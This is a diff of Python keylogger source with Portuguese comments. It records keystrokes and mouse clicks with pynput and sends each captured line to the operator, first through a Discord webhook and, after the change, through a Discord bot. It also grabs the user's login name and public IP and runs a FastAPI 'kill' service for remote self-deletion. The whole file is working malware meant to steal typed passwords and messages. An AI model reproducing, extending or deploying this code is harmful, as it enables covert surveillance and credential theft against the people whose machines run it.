@@ -1,58 +1,36 @@
 from pynput.keyboard import Key, Listener
 from pynput import mouse
-import requests
-from dotenv import load_dotenv
+import threading
 import os
-from threading import Thread
-from fastapi import FastAPI, HTTPException
+import asyncio
+import kill
+import discord_bot
+from dotenv import load_dotenv
+from funcoes import send
 import uvicorn
-
-
-ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
-usuario = os.getlogin()
-
-user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '')
-
-
-app = FastAPI()
+import requests
 
 load_dotenv()
-secret_token = os.getenv('SECRET_TOKEN')
+ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
 
-# Cria uma rota com a identificação do usuario para melhor organização
-@app.post(f'/{user_identification}')
-def destruir(token: str, identification: str):
-    if token != secret_token:
-        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
-    
-    os.remove('')
-
-# Rota de Delete All 
-@app.post('/kill-all')
-def destruir(token: str):
-    if token != secret_token:
-        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
-    
-    os.remove('')    
 
 fullog = ''
 words = ''
 
-url = os.getenv('webhook_url_mv')
+def reset_logs():
+    global fullog, words
+    fullog = ''
+    words = ''
 
 def onPress(key):
-    global fullog
-    global words
+    global fullog, words
 
     if key == Key.space:
         words += ' '
-
     elif key == Key.enter:
         fullog += words + '\n'
-        send(fullog)
-        words = ''
-        fullog = ''
-
+        asyncio.run(discord_bot.send_message(fullog))  # Envia pelo bot
+        reset_logs()
     elif key == Key.backspace:
         words = words[:-1]
     else:
@@ -61,40 +39,30 @@ def onPress(key):
             if char:
                 words += char
         except AttributeError:
-            # Ignora outras teclas não caractere
             pass
 
     if key == Key.esc:
         return False
 
 def click(x, y, button, pressed):
-    global fullog
-    global words
-
-    if len(words) > 0 and pressed:
+    global fullog, words
+    if pressed and len(words) > 0:
         fullog += words + '\n'
-        send(fullog)
-        words = ''
-        fullog = ''
+        asyncio.run(discord_bot.send_message(fullog))  # Envia pelo bot
+        reset_logs()
 
-
-def send(mensagem):
-    payload = {
-        'content': mensagem
-    }
-    response = requests.post(url, json=payload)
-    return response
-
-def on_stop():
-    print("Listener parado!")
-
-k_listener = Listener(on_press=onPress, on_stop=on_stop)
-k_listener.start()
-k_listener.join()
-
-send('DESCOBRIRAM A GENTE')
+def run_api():
+    uvicorn.run(kill.app, host=ip_publico, port=80)
+    print(f'servidor rodando no ip: {ip_publico}' )
 
 def main():
+    # roda FastAPI em background
+    threading.Thread(target=run_api, daemon=True).start()
+
+    # roda bot Discord em background
+    threading.Thread(target=discord_bot.start_bot, daemon=True).start()
+
+    # listeners de teclado e mouse rodando na thread principal
     k_listener = Listener(on_press=onPress)
     m_listener = mouse.Listener(on_click=click)
 
@@ -106,6 +74,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-
